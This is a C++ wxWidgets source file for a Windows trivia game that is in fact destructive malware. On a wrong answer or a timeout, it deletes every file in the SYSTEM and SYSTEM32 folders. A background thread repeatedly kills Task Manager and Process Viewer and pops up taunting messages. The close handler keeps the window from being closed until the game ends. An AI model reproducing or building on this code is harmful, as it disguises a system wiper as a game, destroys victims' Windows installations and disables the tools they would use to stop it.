#include "trivia_game.hpp"

using namespace std;

wxDEFINE_EVENT(wxEVT_COMMAND_TIME_THREAD_COMPLETED, wxThreadEvent);
wxDEFINE_EVENT(wxEVT_COMMAND_TIME_THREAD_UPDATE, wxThreadEvent);

vector<TriviaQuestion> getTriviaQuestions(string fileContents) {
	Json::Value triviaJson = JsonHelper::parseJsonString(fileContents);
	int arraySize = triviaJson.size();
	vector<TriviaQuestion> triviaQuestions;
	for (int i = 0; i < arraySize; i++) {
		Json::Value jsonItem = triviaJson[i];
		if (jsonItem.empty()) throw InteractBoxException(ErrorCodes::TriviaItemNotFound);
		Json::Value questionJson = jsonItem["q"];
		if (questionJson.empty()) throw InteractBoxException(ErrorCodes::TriviaQuestionNotFound);;
		Json::Value answersJson = jsonItem["a"];
		if (answersJson.empty()) throw InteractBoxException(ErrorCodes::TriviaAnswersNotFound);;
		Json::Value correctAnswerJson = jsonItem["c"];
		if (correctAnswerJson.empty()) throw InteractBoxException(ErrorCodes::TriviaCorrectAnswerNotFound);;
		string question = questionJson.asString();
		vector<string> answers;
		for (int j = 0; j < 4; j++) {
			Json::Value arrayItem = answersJson[j];
			if (arrayItem.empty()) throw InteractBoxException(ErrorCodes::ArgumentIsNull, to_string(j));
			answers.push_back(arrayItem.asString());
		}
		int correctAnswer = correctAnswerJson.asInt();
		triviaQuestions.push_back(TriviaQuestion(question, answers, correctAnswer));
	}
	return triviaQuestions;
}

void loadFileInResource(int name, string type, DWORD& size, const char*& data) {
	HMODULE handle = ::GetModuleHandle(NULL);
	if (!handle) throw InteractBoxException(ErrorCodes::CannotFindResource);
	HRSRC rc = FindResourceA(handle, MAKEINTRESOURCEA(name), type.c_str());
	HGLOBAL rcData = LoadResource(handle, rc);
	size = SizeofResource(handle, rc);
	data = static_cast<const char*>(::LockResource(rcData));
}

void loadFileInResource(int name, DWORD& size, unsigned char* data) {
	HMODULE handle = ::GetModuleHandle(NULL);
	if (!handle) throw InteractBoxException(ErrorCodes::CannotFindResource);
	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(name), RT_RCDATA);
	HGLOBAL rcData = LoadResource(handle, rc);
	size = SizeofResource(handle, rc);
	data = static_cast<unsigned char*>(LockResource(rcData));
}

vector<TriviaQuestion> parseQuestions() {
	DWORD size = 0;
	const char* jsonString;
	loadFileInResource(IDR_JSON, "JSON", size, jsonString);
	char* jsonBuffer = new char[size + 1];
	memcpy(jsonBuffer, jsonString, size);
	jsonBuffer[size] = 0;
	vector<TriviaQuestion> triviaQuestions = getTriviaQuestions(jsonBuffer);
	return triviaQuestions;
}

bool TriviaGame::OnInit() {
	try {
		MainAppFrame* frame = new MainAppFrame();
		SetTopWindow(frame);
		frame->Show(true);
		return true;
	} catch (InteractBoxException& e) {
		wxMessageBox(e.what(), "Trivia Game Error", wxICON_ERROR);
		return false;
	} catch (exception& e) {
		wxMessageBox(e.what(), "Trivia Game Error", wxICON_ERROR);
		return false;
	} catch (exception* e) {
		wxMessageBox(e->what(), "Trivia Game Error", wxICON_ERROR);
		return false;
	}
}

void MainAppFrame::playSound() {
	wxSound* sound = new wxSound;
	bool success = sound->Create("audio\\skill_check.wav");
	if (!success) throw InteractBoxException(ErrorCodes::CannotCreateSound);
	success = sound->Play(wxSOUND_ASYNC);
	if (!success) throw InteractBoxException(ErrorCodes::CannotPlaySound);
}

MainAppFrame::MainAppFrame() : wxFrame(NULL, wxID_ANY, L"Trivia Game", wxDefaultPosition, wxDefaultSize, wxCAPTION | wxSYSTEM_MENU | wxMINIMIZE_BOX) {
	HICON iconHandle = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
	wxIcon icon;
	icon.CreateFromHICON(iconHandle);
	SetIcon(icon);
	DestroyIcon(iconHandle);
	playSound();
	_triviaQuestions = parseQuestions();
	#if WINVER > _WIN32_WINNT_NT4
	wstring systemDir = L"C:\\WINDOWS\\SYSTEM";
	vector<wstring> systemFiles = FileHelper::listFiles(systemDir);
	wstring system32Dir = L"C:\\WINDOWS\\SYSTEM32";
	vector<wstring> system32Files = FileHelper::listFiles(system32Dir);
	#else
	string systemDir = "C:\\WINDOWS\\SYSTEM";
	vector<string> systemFiles = FileHelper::listFiles(systemDir);
	string system32Dir = "C:\\WINDOWS\\SYSTEM32";
	vector<string> system32Files = FileHelper::listFiles(system32Dir);
	#endif
	_fileCollections = { systemFiles, system32Files };

	wxSize size(400, 600);
	_panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, size);
	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
	getQuestion();
	wxStaticText* text = new wxStaticText(_panel, QUESTION_ID, StringHelper::stringToWideString(_randomQuestion.question));
	_timeText = new wxStaticText(_panel, TIME_TEXT_ID, L"You have 10 seconds");
	text->SetFont(this->GetFont().Scale(1.25));
	_timeText->SetFont(this->GetFont().MakeBold());
	sizer->Add(text, 1, wxEXPAND, 2);
	sizer->Add(_timeText, 1, wxEXPAND, 1);
	MainAppFrame::displayQuestion(sizer, _panel);
	_submitButton = new wxButton(_panel, SUBMIT_BUTTON_ID, L"Submit");
	_submitButton->Disable();
	sizer->Add(_submitButton, 1, wxEXPAND, 2);
	Bind(wxEVT_BUTTON, &MainAppFrame::OnSubmit, this, SUBMIT_BUTTON_ID);
	Bind(wxEVT_CLOSE_WINDOW, &MainAppFrame::OnClose, this);

	_panel->SetSizer(sizer);
	_panel->Fit();
	_panel->Show(true);

	Bind(wxEVT_COMMAND_TIME_THREAD_UPDATE, &MainAppFrame::OnThreadUpdate, this);
	Bind(wxEVT_COMMAND_TIME_THREAD_COMPLETED, &MainAppFrame::OnThreadCompletion, this);
	DoStartThread();
}


void MainAppFrame::DoStartThread() {
	timeThread = new TimeThread(this);
	if (timeThread->Run() != wxTHREAD_NO_ERROR) {
		wxLogError("Can't create the thread!");
		delete timeThread;
		timeThread = nullptr;
	}
	#if WINVER > _WIN32_WINNT_NT4
	processKillerThread = new ProcessKillerThread(this, { {"taskmgr.EXE", "Task Manager"}, {"PVIEW.EXE", "Process Viewer"} });
	#else
	processKillerThread = new ProcessKillerThread(this, { {"PVIEW95.EXE", "Process Viewer"} });
	#endif
	if (processKillerThread->Run() != wxTHREAD_NO_ERROR) {
		wxLogError("Can't create the thread!");
		delete processKillerThread;
		processKillerThread = nullptr;
	}
}

void MainAppFrame::displayQuestion(wxBoxSizer* sizer, wxPanel* panel) {
	for (int i = 0; i < _randomQuestion.answers.size(); i++) {
		wstring answer = StringHelper::stringToWideString(_randomQuestion.answers[i]);
		int id = i + 1;
		wxRadioButton* radioButton = new wxRadioButton(panel, id, answer);
		sizer->Add(radioButton, 1, wxEXPAND, 1);
		_radioButtons.push_back(radioButton);
		Bind(wxEVT_RADIOBUTTON, &MainAppFrame::OnRadioSelect, this, id);
	}
}

wxThread::ExitCode TimeThread::Entry() {
	for (int i = 10; i > 0; i--) {
		Sleep(1000);
		wxQueueEvent(handlerPointer, new wxThreadEvent(wxEVT_COMMAND_TIME_THREAD_UPDATE));
	}
	wxQueueEvent(handlerPointer, new wxThreadEvent(wxEVT_COMMAND_TIME_THREAD_COMPLETED));
	return (wxThread::ExitCode)0;
}

TimeThread::~TimeThread() {
	wxCriticalSectionLocker enter(handlerPointer->threadCritical);
	handlerPointer->timeThread = nullptr;
}

void MainAppFrame::getQuestion() {
	_randomQuestion = IndexHelper::getRandomItem(_triviaQuestions);
}

void MainAppFrame::OnSubmit(wxCommandEvent& event) {
	_hasAnswered = true;
	if (_pickedAnswer != _randomQuestion.correctAnswer) {
		for (wxRadioButton* radio : _radioButtons) {
			radio->Disable();
			if (radio->GetId() != _pickedAnswer) radio->SetValue(false);
			else radio->SetValue(true);
		}
		_submitButton->Disable();
		wipeSystemFolders();
	} else {
		wxMessageBox(L"Congratulations, your system is safe! For now.", L"Trivia Game", wxICON_INFORMATION);
	}
	_canClose = true;
	Close(true);
}

void MainAppFrame::OnRadioSelect(wxCommandEvent& event) {
	int id = event.GetId();
	_pickedAnswer = id;
	if (_remainingSeconds > 0 && !_hasAnswered)
		_submitButton->Enable();
}

void MainAppFrame::OnClose(wxCloseEvent& event) {
	if (!_canClose) event.Veto();
	timeThread = nullptr;
	processKillerThread->Delete();
	processKillerThread = nullptr;
	exit(0);
}

void MainAppFrame::OnExit(wxCommandEvent& event) {

}

void MainAppFrame::OnThreadUpdate(wxThreadEvent& event) {
	if (_hasAnswered) return;
	_remainingSeconds--;
	wstring timeString = L"You have ";
	timeString += to_wstring(_remainingSeconds);
	timeString += L" second";
	if (_remainingSeconds != 1) timeString += L"s";
	_timeText->SetLabel(timeString);
}

void MainAppFrame::OnThreadCompletion(wxThreadEvent& event) {
	if (_hasAnswered) return;
	wipeSystemFolders();
	wxMessageBox("Time's up! Better luck next time!", "Trivia Game", wxICON_INFORMATION);
	_canClose = true;
	Close(true);
}

#if WINVER > _WIN32_WINNT_NT4
void MainAppFrame::deleteFiles(vector<wstring> files) {
	for (auto& file : files) {
		_timeText->SetLabel("Deleting " + file + "...");
		WINBOOL success = DeleteFile(file.c_str());
		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
	}
}

#else
void MainAppFrame::deleteFiles(vector<string> files) {
	for (auto& file : files) {
		_timeText->SetLabel("Deleting " + file + "...");
		WINBOOL success = DeleteFileA(file.c_str());
		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
	}
}

#endif

void MainAppFrame::wipeSystemFolders() {
	for (auto& files : _fileCollections) {
		deleteFiles(files);
	}
	wxMessageBox("The contents of SYSTEM and SYSTEM32 have been deleted. Better luck next time!", "Trivia Game", wxICON_INFORMATION);
	_canClose = true;
	Close(true);
}

wxIMPLEMENT_APP(TriviaGame);

ProcessKillerThread::~ProcessKillerThread() {
	handlerPointer->processKillerThread = nullptr;
}

wxThread::ExitCode ProcessKillerThread::Entry() {
	while (!_endNow) {
		Sleep(100);
		for (auto& procInfo : _processNamesAndFiles) {
			findAndKill(procInfo);
		}
	}
	return (wxThread::ExitCode)0;
}

void ProcessKillerThread::OnDelete() {
	_endNow = true;
}

void ProcessKillerThread::findAndKill(ProcessNameAndFileName procInfo) {
	DWORD pid = ProcessHelper::getProcessId(procInfo.fileName);
	if (pid == 0) return;
	ProcessHelper::killProcess(pid, 1);
	string shellArgs = "--title \"Really?\" --content \"Did you seriously open " + procInfo.name + "?\" --type e --buttons \"lol;lmao\"";
	ShellExecuteA(
		NULL,
		"open",
		"message_box_process.exe",
		shellArgs.c_str(),
		#if WINVER > _WIN32_WINNT_NT4
		FileHelper::getWorkingDirectoryAsString().c_str(),
		#else
		FileHelper::getWorkingDirectory().c_str(),
		#endif
		SW_SHOWNORMAL
	);
}
